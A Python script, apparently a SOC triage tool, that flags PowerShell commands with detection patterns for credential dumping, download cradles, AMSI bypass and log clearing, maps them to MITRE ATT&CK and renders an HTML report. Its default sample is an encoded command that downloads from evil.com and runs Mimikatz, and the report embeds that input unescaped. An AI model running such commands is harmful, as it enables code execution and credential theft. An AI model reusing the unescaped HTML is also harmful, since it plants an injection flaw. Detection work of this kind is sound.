import base64
import json
import os
import re
import sys
import webbrowser
from datetime import datetime

SUSPICIOUS_PATTERNS = {
    "PowerShell Encoded": r"(?i)-e(nc(odedcommand)?)?\s+([A-Za-z0-9+/=]{10,})",
    "Download Cradle": r"(?i)(downloadstring|downloadfile|iwr|curl|wget)",
    "Shadow Copy Deletion": (
        r"(?i)(vssadmin.*delete.*shadows|wmic.*shadowcopy.*delete)"
    ),
    "Credential Access / Dumping": r"(?i)(sekurlsa|mimikatz|lsass|comsvcs\.dll)",
    "Discovery / Recon": r"(?i)(whoami\s+/all|net\s+group|nltest\s+/domain_trusts)",
    "Process Injection / Token": (
        r"(?i)(create-remotethread|inject|token::elevate)"
    ),
    "Defense Evasion (AMSI Bypass)": (
        r"(?i)(amsiutils|amsiinitfailed|\[ref\]\.assembly\.gettype)"
    ),
    "Persistence (Scheduled Task)": (
        r"(?i)(schtasks.*/create|new-scheduledtaskaction|register-scheduledjob)"
    ),
    "Indicator Removal (Clear Logs)": (
        r"(?i)(wevtutil.*cl|clear-eventlog|remove-item.*\.evtx)"
    ),
}

MITRE_MAPPING = {
    "PowerShell Encoded": (
        "T1059.001 - Command and Scripting Interpreter: PowerShell"
    ),
    "Download Cradle": "T1105 - Ingress Tool Transfer",
    "Shadow Copy Deletion": "T1490 - Inhibit System Recovery",
    "Credential Access / Dumping": "T1003 - OS Credential Dumping",
    "Discovery / Recon": "T1082 - System Information Discovery",
    "Process Injection / Token": "T1134 - Access Token Manipulation",
    "Defense Evasion (AMSI Bypass)": "T1562.001 - Impair Defenses: Disable Tools",
    "Persistence (Scheduled Task)": (
        "T1053.005 - Scheduled Task/Job: Scheduled Task"
    ),
    "Indicator Removal (Clear Logs)": (
        "T1070.001 - Indicator Removal: Clear Windows Event Logs"
    ),
}


def deobfuscate(cmd):
  match = re.search(r"(?i)-e(?:nc(?:odedcommand)?)?\s+([A-Za-z0-9+/=]+)", cmd)
  if match:
    raw_b64 = match.group(1)
    try:
      decoded_bytes = base64.b64decode(raw_b64)
      try:
        text_u8 = decoded_bytes.decode("utf-8")
        if any(
            k in text_u8.lower()
            for k in [
                "iex",
                "download",
                "http",
                "mimikatz",
                "invoke",
                "amsi",
                "schtasks",
            ]
        ):
          return text_u8.strip()
      except Exception:
        pass
      return decoded_bytes.decode("utf-16le", errors="ignore").strip()
    except Exception:
      return None
  return None


def run_triage(cmd):
  decoded = deobfuscate(cmd)
  full_payload = f"{cmd} {decoded if decoded else ''}"

  score = 10
  indicators = []

  for category, pattern in SUSPICIOUS_PATTERNS.items():
    if re.search(pattern, full_payload):
      indicators.append(
          {"category": category, "mitre": MITRE_MAPPING.get(category, "N/A")}
      )
      score += 25

  if decoded:
    score += 20

  final_score = min(score, 100)

  if final_score >= 60:
    verdict = "MALICIOUS (High Confidence)"
    action = "Immediate Host Isolation & Revoke Credentials"
    theme_color = "#dc2626"
  elif final_score >= 35:
    verdict = "SUSPICIOUS (Review Needed)"
    action = "Check Parent Process Lineage & User Baseline"
    theme_color = "#d97706"
  else:
    verdict = "BENIGN / LOW NOISE"
    action = "Mark as False Positive / Baseline Rule"
    theme_color = "#16a34a"

  # SIEM-Ready JSON Export
  log_entry = {
      "timestamp": datetime.utcnow().isoformat() + "Z",
      "command": cmd,
      "deobfuscated_payload": decoded,
      "verdict": verdict,
      "risk_score": final_score,
      "recommended_action": action,
      "mitre_techniques": indicators,
  }

  log_file = "triage_events.json"
  with open(log_file, "a", encoding="utf-8") as jf:
    jf.write(json.dumps(log_entry) + "\n")

  # HTML Dashboard Generation
  rows = ""
  for ind in indicators:
    rows += (
        "<tr><td"
        " style='padding:10px;border-bottom:1px solid #334155;color:#38bdf8;'>"
        f"{ind['category']}</td><td"
        " style='padding:10px;border-bottom:1px solid #334155;color:#e879f9;'>"
        f"{ind['mitre']}</td></tr>"
    )

  if not rows:
    rows = (
        "<tr><td colspan='2' style='padding:10px;color:#94a3b8;'>No direct"
        " attack patterns triggered.</td></tr>"
    )

  decoded_html = (
      "<div style='margin-top:20px;padding:15px;background:#0f172a;border-left:4px"
      " solid #22c55e;border-radius:6px;'><b style='color:#22c55e;'>Auto"
      " De-obfuscated Payload:</b><pre"
      " style='color:#facc15;white-space:pre-wrap;margin-top:5px;font-size:14px;'>"
      f"{decoded}</pre></div>"
      if decoded
      else ""
  )

  html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>TriageOps - SOC Incident Report</title>
</head>
<body style="background:#020617;color:#f8fafc;font-family:Segoe UI,sans-serif;padding:30px;">
    <div style="max-width:850px;margin:auto;background:#1e293b;padding:25px;border-radius:12px;border:2px solid {theme_color};">
        <div style="display:flex;justify-content:space-between;align-items:center;">
            <h1 style="margin:0;font-size:22px;color:#38bdf8;">TriageOps &mdash; SOC Incident Analysis</h1>
            <span style="font-size:12px;color:#94a3b8;background:#0f172a;padding:5px 10px;border-radius:4px;">SIEM Ingest: Ready</span>
        </div>
        
        <div style="padding:15px;background:#0f172a;border-radius:8px;margin:15px 0;">
            <p style="margin:5px 0;"><b>Verdict:</b> <span style="color:{theme_color};font-weight:bold;">{verdict}</span></p>
            <p style="margin:5px 0;"><b>Risk Score:</b> {final_score} / 100</p>
            <p style="margin:5px 0;"><b>Recommended Action:</b> <u>{action}</u></p>
        </div>
        
        <div style="margin-top:15px;padding:15px;background:#0f172a;border-radius:6px;">
            <b style="color:#94a3b8;">Original Telemetry Command:</b>
            <pre style="color:#e2e8f0;white-space:pre-wrap;margin-top:5px;">{cmd}</pre>
        </div>

        {decoded_html}

        <h3 style="margin-top:25px;color:#cbd5e1;">Detected Behaviors & MITRE ATT&CK Mapping</h3>
        <table style="width:100%;border-collapse:collapse;background:#0f172a;border-radius:6px;overflow:hidden;">
            <thead>
                <tr style="background:#334155;text-align:left;">
                    <th style="padding:10px;color:#f8fafc;">Category</th>
                    <th style="padding:10px;color:#f8fafc;">Technique</th>
                </tr>
            </thead>
            <tbody>
                {rows}
            </tbody>
        </table>
    </div>
</body>
</html>"""

  report_path = os.path.abspath("triage_report.html")
  with open(report_path, "w", encoding="utf-8") as f:
    f.write(html_content)

  webbrowser.open(f"file://{report_path}")


if __name__ == "__main__":
  if len(sys.argv) > 1:
    target_cmd = " ".join(sys.argv[1:])
  else:
    target_cmd = (
        "powershell.exe -NoP -NonI -W Hidden -Enc"
        " SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vZXZpbC5jb20vYScpOyBJbnZva2UtTWltaWthdHo="
    )
  run_triage(target_cmd)